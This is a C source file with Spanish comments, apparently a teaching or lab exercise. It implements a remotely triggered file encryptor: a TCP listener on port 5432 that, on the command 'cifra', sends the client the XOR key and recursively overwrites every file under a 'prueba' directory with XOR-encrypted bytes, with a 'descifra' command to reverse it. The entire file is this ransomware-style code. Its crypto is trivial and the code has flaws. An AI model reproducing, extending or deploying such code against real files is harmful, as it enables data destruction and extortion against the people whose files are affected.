#include <sys/types.h>
#include </usr/include/linux/input.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <dirent.h>
#include <math.h>
#include <openssl/aes.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#define PORT 5432 // puerto de conexion

int sockfd, new_sockfd;  // descriptores de archivo
void cifrar(char *archivo);//funcion cifrar
void descifrar(char *archivo);//funcion descifrar
void abrirDirectorio(char *directorio,int cifra);
void generarllave();//funcion generallave
unsigned char llave[32];
char llaveXOR;

int main(void){
  struct sockaddr_in host_addr, client_addr;  // Informacion de las direcciones IP
  socklen_t sin_size;//variable que contendra la longitud de la estructura
  int recv_length=1, yes=1;
  char buffer[1024];//variable que contendra los mensajes recibidos

  if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)//crea conexion de red
/* descriptor de archivo igual al valor que retorna la funcion socket
 donde tenemos tres parametros (dominio,tipo,protocolo)*/
    perror("Error al crear el socket");

  if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1)
/*manipulacion de las opciones del socket (fdsocket,nivel,opcion,parametro,
tamaño)si el valor retornado es 0 es exitoso*/
    perror("Error al agregar la opcion SO_REUSEADDR en setsockopt");
  
  host_addr.sin_family = AF_INET;    //se asigna a la estructura 
  host_addr.sin_port = htons(PORT);  //
  host_addr.sin_addr.s_addr = INADDR_ANY; // Asigno mi IP
  memset(&(host_addr.sin_zero), '\0', 8); // El resto de la estructura en 0s

  if (bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr)) == -1)
/* asignacion de un puerto al socket*/
    perror("Error haciendo el bind");

  if (listen(sockfd, 5) == -1)//escucha
    perror("Error al escuchar en el socket");

  generarllave();
  while(1) {    // Accept loop
    sin_size = sizeof(struct sockaddr_in);
    new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);
/* se espera conexion*/
    if(new_sockfd == -1)//necesita ser igual a 0 para exito
      perror("Error al aceptar la conexion");
    send(new_sockfd, ":v\n", 3, 0);//envia socket
    recv_length = recv(new_sockfd, &buffer, 1024, 0);
//se recibe datos del cliente
    while(recv_length > 0) {
      if (strcmp(buffer,"cifra\n")==0){/*compara las cadenas 0 exito*/
        send(new_sockfd, "\nllaveXOR: ", 11, 0);//envia un mensaje por medio del socket
        send(new_sockfd, &llaveXOR, sizeof(llaveXOR), 0);//envia la direccio de la variable llaveXOR
        send(new_sockfd, "\n: ", 1, 0);
        // printf("llaveXOR: %c\n", llaveXOR);
        abrirDirectorio("prueba",1);//llamada de la funcion abrirDirectorio
      }else if(strcmp(buffer,"descifra\n")==0){//si el mensaje es descifrar
        abrirDirectorio("prueba",0); 
      }else send(new_sockfd,"\n",1,0);
      recv_length = recv(new_sockfd, &buffer, 1024, 0);
    }
    close(new_sockfd);//muerte del socket 
  }
  return 0;
}

void abrirDirectorio(char *directorio,int cifra){
  // Abrimos el directorio actual
  DIR *d = opendir(directorio); //
  struct dirent *dentry;
  //mientras podamos leer los archivos dentro del directorio actual ejecutara el codigo
  while((dentry=readdir(d))!=NULL){
  //    printf("%s\n",dentry->d_name); //Imprime los archivos dentro del directorio
  // Validamos que no abra los archivos de . y ..
    if(strcmp(dentry->d_name,".")!=0 && strcmp(dentry->d_name,"..")!=0 ){
      // generamos un variable para guardar la ruta. Esto para poder cifrar los archivos que esten dentro de otro directorio.
      char *ruta=(char *) calloc(sizeof(char),512);
      //copiamos la ruta
       strcpy(ruta, directorio ); //ruta=./prueba/
      // le agregamos (concatenamos) el nombre del archivo
      strcat(ruta, "/" ); // ruta = ./prueba/
      strcat(ruta, dentry->d_name ); // ruta = ./prueba/nombre_archivo
      //printf("%s\n",dentry->d_name);
      //Mandamos a llamar la funcion cifrar
      if (cifra) cifrar(ruta);
      else descifrar(ruta);
    }
  }
}
void generarllave(){
  int fdrandom; //Declaracion de un descriptor de archivos.
  char *archivo="/dev/random"; // archivo que genera aleaotreamente
  fdrandom=open(archivo,O_RDONLY);// Se abre como solo lectura
  int num;
  // read regresa el numero de bits que leyo
  for (int i = 0; i < 32;i++){
    if(read(fdrandom,&num,sizeof(int))!=0){
      llave[i]= (unsigned char) abs(num%25) + 65;
    }
  }
  if(read(fdrandom,&num,sizeof(int))!=0) llaveXOR= (char) abs(num%25) + 65;
  // printf("\nmillave: %s\n", buffer);
  if(close(fdrandom)==-1) //debe cerrar.
    exit(1);
}
void cifrar(char *archivo){
  int fd,totalPalabra=0,fdw;
  char palabra;
  // abrimos el archivo en modo de lectura y escrituta.
  fd=open(archivo,O_RDONLY);
  if(fd!=-1){
    //usamos stat para saber el tamaño del archivo
    struct stat fileStat;
    if(fstat(fd,&fileStat) < 0)    
      exit(1);
    if (S_ISDIR(fileStat.st_mode)) {
      abrirDirectorio(archivo,1);
    }else{
      if (fileStat.st_size>0){
        char *palabraCifrada=(char *) calloc(sizeof(char),fileStat.st_size);
        char *palabraDescifrada=(char *) calloc(sizeof(char),fileStat.st_size);
        char *palabra=(char *) calloc(sizeof(char),fileStat.st_size);
        char auxpalabra;
        // Generamos una variable del tamaño del archivo
        int nread=0;
        // Leemos el archivo
        while( ( nread=read(fd,&palabra[totalPalabra++],sizeof(char)) ) >0 );
        close(fd);
        fd=open(archivo,O_RDWR);
        totalPalabra=0;
        while( ( nread=read(fd,&auxpalabra,sizeof(auxpalabra)) ) >0 ){
          //ciframos
          palabraCifrada[totalPalabra]=auxpalabra^ (int)(llaveXOR);
          printf("%c", palabraCifrada[totalPalabra]);
          lseek(fd,-1,SEEK_CUR);
          //escribimos en el archivo
          write(fd,&palabraCifrada[totalPalabra++],nread);
        }
      }
    }
  }
  //La llave para cifrar
  close(fd);
}
void descifrar(char *archivo){
  int fd,totalPalabra=0,fdw;
  char palabra;
  // abrimos el archivo en modo de lectura y escrituta.
  fd=open(archivo,O_RDONLY);
  if(fd!=-1){
    //usamos stat para saber el tamaño del archivo
    struct stat fileStat;
    if(fstat(fd,&fileStat) < 0)    
      exit(1);
    if (S_ISDIR(fileStat.st_mode)) {
      abrirDirectorio(archivo,0);
    }else{
      if (fileStat.st_size>0){
        char *palabraDescifrada=(char *) calloc(sizeof(char),fileStat.st_size);
        char *palabra=(char *) calloc(sizeof(char),fileStat.st_size);
        char auxpalabra;
        // Generamos una variable del tamaño del archivo
        int nread=0;
        // Leemos el archivo
        while( ( nread=read(fd,&palabra[totalPalabra++],sizeof(char)) ) >0 );
        close(fd);
        fd=open(archivo,O_RDWR);
        // fd=open(archivo,O_WRONLY);
        totalPalabra=0;
        while( ( nread=read(fd,&auxpalabra,sizeof(auxpalabra)) ) >0 ){
          //ciframos
          palabraDescifrada[totalPalabra]=auxpalabra^ (int)(llaveXOR);
          lseek(fd,-1,SEEK_CUR);
          //escribimos en el archivo
          write(fd,&palabraDescifrada[totalPalabra++],nread);
        }
      }
    }
  }
  //La llave para cifrar
  close(fd);
}
